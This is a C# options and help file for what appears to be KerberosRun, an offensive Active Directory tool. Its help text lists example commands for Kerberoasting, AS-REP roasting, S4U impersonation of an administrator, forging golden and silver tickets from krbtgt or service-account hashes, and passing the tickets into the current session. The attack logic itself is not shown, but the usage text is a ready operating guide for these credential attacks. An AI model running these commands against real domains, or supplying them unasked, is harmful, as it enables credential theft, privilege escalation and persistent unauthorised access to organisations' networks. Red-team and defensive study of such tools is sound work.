using CommandLine;

namespace KerberosRun
{
    public class Options
    {
        public static Options Instance { get; set; }
        /// <summary>
        /// Commands
        /// </summary>
        [Option("Kerberoast", Default = false, HelpText = "Perform Kerberoasting...")]
        public bool Kerberoast { get; set; }

        [Option("Asreproast", Default = false, HelpText = "Perform Asreproasting...")]
        public bool Asreproast { get; set; }

        [Option("AskTGT", Default = false, HelpText = "Ask for a TGT...")]
        public bool AskTGT { get; set; }

        [Option("AskTGS", Default = false, HelpText = "Ask for a TGS...")]
        public bool AskTGS { get; set; }

        [Option("S4U", Default = false, HelpText = "Perform S4U...")]
        public bool S4U { get; set; }

        [Option("S4U2Self", Default = false, HelpText = "Perform S4U2Self...")]
        public bool S4U2Self { get; set; }

        [Option("Sliver", Default = false, HelpText = "Build Sliver Ticket...")]
        public bool Sliver { get; set; }

        [Option("Golden", Default = false, HelpText = "Build Golden Ticket...")]
        public bool Golden { get; set; }

        //[Option("S4U2Proxy", Default = false, HelpText = "Perform S4U2Proxy...")]
        //public bool S4U2Proxy { get; set; }

        [Option("Ticket", Default = null, HelpText = "Pass base64 encoded kirbi ticket...")]
        public string Ticket { get; set; }





        /// <summary>
        /// Parameters
        /// </summary>
        [Option("Domain", Default = null, HelpText = "Domain Name")]
        public string Domain { get; set; }

        [Option("User", Default = null, HelpText = "Username")]
        public string User { get; set; }

        [Option("Impersonateuser", Default = null, HelpText = "Impersonate Username")]
        public string Impersonate { get; set; }

        [Option("Pass", Default = null, HelpText = "Password")]
        public string Pass { get; set; }

        [Option("Host", Default = null, HelpText = "Target Server")]
        public string Host { get; set; }

        [Option("Service", Default = null, HelpText = "Service for a sliver ticket")]
        public string Service { get; set; }

        [Option("RC4", Default = null, HelpText = "RC4 Hash")]
        public string RC4 { get; set; }

        [Option("AES128", Default = null, HelpText = "AES128 Hash")]
        public string AES128 { get; set; }

        [Option("AES256", Default = null, HelpText = "AES256 Hash")]
        public string AES256 { get; set; }

        [Option("Spn", Default = null, HelpText = "SPN")]
        public string Spn { get; set; }

        [Option("Format", Default = "hashcat", HelpText = "Hash Format")]
        public string Format { get; set; }

        //[Option("KrbtgtHash", Default = null, HelpText = "Krbtgt Account Hash")]
        //public string KrbtgtHash { get; set; }

        [Option("UserID", Default = 500, HelpText = "User ID")]
        public int UserID { get; set; }

        [Option("DomainSID", Default = null, HelpText = "Domain SID")]
        public string DomainSID { get; set; }

        [Option("DecryptEtype", Default = null, HelpText = "Decrypt Encryption Type")]
        public string DecryptEtype { get; set; }

        [Option("DecryptTGT", Default = null, HelpText = "Decrypt TGT")]
        public string DecryptTGT { get; set; }

        [Option("DecryptTGS", Default = null, HelpText = "Decrypt TGS")]
        public string DecryptTGS { get; set; }

        [Option("SrvName", Default = null, HelpText = "Service Account Name for decrypting TGS")]
        public string SrvName { get; set; }

        [Option("Verbose", Default = false, HelpText = "Verbose")]
        public bool Verbose { get; set; }

        [Option("Outfile", Default = false, HelpText = "Write Kirbi file.")]
        public bool Outfile { get; set; }

        [Option("PTT", Default = false, HelpText = "Pass The Ticket into current session")]
        public bool PTT { get; set; }

        [Option("NoPAC", Default = false, HelpText = "No PAC")]
        public bool NoPAC { get; set; }


        public static void GetHelp()
        {
            var help = @"
Usage: KerberosRun.exe -h
    
    [--AskTGT]              Ask for a TGT
        --User*             A valid username
        --Pass              A valid password
        --NopaC             Do not request PAC

    [--AskTGS]              Ask for a TGS
        --User*             A valid username
        --Pass              A valid password   
        --SPN*              Target SPN for the service request

    [--Kerberoast]          Kerberoasting
        --User*             A valid username
        --Pass              A valid password   
        --SPN*              Target SPN for Kerberoasting

    [--Asreproast]          ASREPRoasting
        --User*             A valid username that does not require PreAuth
        --Format            Output Hash format (John/Hashcat, Default: Hashcat)

    [--S4U2Self]            Service for User to Self
        --User*             A valid username that has SPN set
        --Pass              A valid password
        --ImperonsateUser*  A user to impersonate

    [--S4U]                 S4U2Self and S4U2Proxy
        --User*             A valid username that has SPN set
        --Pass              A valid password
        --Imperonsate*      A user to impersonate
        --SPN*              Target SPN for impersonate user

    [--Golden]              Build a Golden Ticket
        --RC4/AES128/AES256 krbtgt account hash
        --DomainSid*        Domain SIDs
        --UserID            User ID (default: 500)
        --User*             User name for the golden ticket

    [--Sliver]              Make a Sliver Ticket
        --RC4/AES128/AES256 Service account hash
        --DomainSid*        Domain SID
        --Service*          Service name (HTTP/CIFS/HOST...)
        --Host*             Target Servers
        --User*             User name for the sliver ticket

    [--Ticket]              Pass base64 encoded kirbi ticket into current session

     --Domain            A valid domain name (default: current domain)
     --RC4/AES128/AES256 A valid hash (alternative way for authentication) 
     --Verbose           Verbose mode
     --Outfile           Write the ticket to a kirbi file under the current directory
     --PTT               Pass the ticket into current session
     --DecryptTGT        Supply the krbtgt hash and decrypt the TGT ticket
     --DecryptTGS        Supply the service account hash and decrypt the TGS ticket
     --DecryptEtype   The encryption type of the hash for decrypting tickets (rc4/aes128/aes256) 
     --SrvName           The service account name for decrypting TGS


Example:  
        .\KerberosRun.exe --Asktgt --user username --pass password --nopac
        .\KerberosRun.exe --Asktgt --user username --pass password --verbose --outfile --decrypttgt [krbtgtHash] --decryptetype aes256
        .\KerberosRun.exe --Asktgs --user username --pass password --spn service/srv.domain.com --verbose --outfile
        .\KerberosRun.exe --Asreproast --user username --verbose
        .\KerberosRun.exe --Kerberoast --user username --rc4 [RC4Hash] --spn service/srv.domain.com
        .\KerberosRun.exe --S4U2Self --user username --aes128 [AES128Hash] --impersonateuser administrator --verbose
        .\KerberosRun.exe --S4U --user username --aes256 [AES256Hash] --impersonateuser administrator --spn ldap/dc1.domain.com --ptt
        .\KerberosRun.exe --Golden --user administrator --domain domain.com --userid 500 --domainsid  [DomainSID] --RC4 [krbtgtHash] --ptt
        .\KerberosRun.exe --Sliver --user administrator --domain domain.com --domainsid  [DomainSID] --RC4 [srvHash] --Service HTTP --HOST DC01$ -ptt
        .\KerberosRun.exe --Ticket Base64EncodedKirbiString/KirbiTicketFiles
                ";
            System.Console.WriteLine(help);
        }

    }
}
